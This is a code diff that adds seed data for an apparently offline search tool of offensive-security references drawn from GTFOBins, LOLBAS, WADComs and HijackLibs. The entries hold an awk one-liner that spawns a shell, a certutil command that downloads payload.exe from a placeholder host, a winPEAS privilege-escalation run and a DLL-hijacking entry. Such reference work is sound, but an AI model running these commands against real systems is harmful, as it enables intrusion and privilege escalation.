@@ -1,0 +1,85 @@
+import type { NormalizedEntry } from '../../src/shared/contracts'
+
+export const seedEntries: NormalizedEntry[] = [
+  {
+    id: 'gtfobins:awk',
+    source: 'gtfobins',
+    slug: 'awk',
+    title: 'awk',
+    category: 'binary',
+    platform: 'linux',
+    summary: 'Unix 文本处理程序，可用于 shell、文件读取和提权场景的离线检索示例。',
+    tags: ['shell', 'file-read', 'suid'],
+    techniques: [],
+    examples: [
+      {
+        id: 'gtfobins:awk:shell',
+        functionName: 'shell',
+        code: "awk 'BEGIN {system(\"/bin/sh\")}'",
+        description: '启动一个 shell。',
+        language: 'bash',
+      },
+    ],
+    references: [{ label: 'GTFOBins', url: 'https://gtfobins.org/gtfobins/awk/' }],
+  },
+  {
+    id: 'lolbas:certutil',
+    source: 'lolbas',
+    slug: 'certutil',
+    title: 'Certutil.exe',
+    category: 'binary',
+    platform: 'windows',
+    summary: 'Windows 原生命令，可用于下载、编码和解码。',
+    tags: ['download', 'encode', 'decode'],
+    techniques: [{ name: 'T1105', reference: 'https://attack.mitre.org/techniques/T1105/' }],
+    examples: [
+      {
+        id: 'lolbas:certutil:download',
+        functionName: 'download',
+        command: 'certutil.exe -urlcache -split -f http://example/payload.exe payload.exe',
+        description: '使用 Certutil 下载文件。',
+        language: 'powershell',
+      },
+    ],
+    references: [{ label: 'LOLBAS', url: 'https://lolbas-project.github.io/lolbas/Binaries/Certutil/' }],
+  },
+  {
+    id: 'wadcoms:winpeas',
+    source: 'wadcoms',
+    slug: 'winpeas',
+    title: 'winPEAS',
+    category: 'tool',
+    platform: 'windows',
+    summary: 'Windows/AD 命令备忘，适合本地离线快速检索。',
+    tags: ['privilege-escalation', 'shell', 'windows'],
+    techniques: [],
+    examples: [
+      {
+        id: 'wadcoms:winpeas:default',
+        command: 'winpeas.exe cmd > output.txt',
+        description: '运行 winPEAS 并输出结果到文件。',
+        language: 'powershell',
+      },
+    ],
+    references: [{ label: 'WADComs', url: 'https://wadcoms.github.io/wadcoms/winPEAS/' }],
+  },
+  {
+    id: 'hijacklibs:version.dll',
+    source: 'hijacklibs',
+    slug: 'version-dll',
+    title: 'version.dll',
+    category: 'dll',
+    platform: 'windows',
+    summary: 'DLL 劫持条目，记录可被利用的加载位置和目标程序。',
+    tags: ['dll-hijacking', 'sideloading'],
+    techniques: [],
+    examples: [
+      {
+        id: 'hijacklibs:version.dll:default',
+        name: 'sideloading',
+        description: '查看该 DLL 对应的可加载程序和放置位置。',
+      },
+    ],
+    references: [{ label: 'HijackLibs', url: 'https://hijacklibs.net/' }],
+  },
+]
